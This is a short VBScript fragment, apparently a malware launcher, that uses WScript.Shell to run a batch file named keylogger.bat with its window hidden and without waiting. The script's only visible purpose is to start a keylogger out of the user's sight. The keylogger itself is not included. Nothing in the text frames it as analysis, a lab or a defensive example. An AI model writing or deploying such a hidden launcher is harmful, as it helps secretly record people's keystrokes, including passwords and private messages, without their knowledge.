Set oShell = CreateObject ("Wscript.Shell") 
Dim strArgs
strArgs = "cmd /c keylogger.bat"
oShell.Run strArgs, 0, false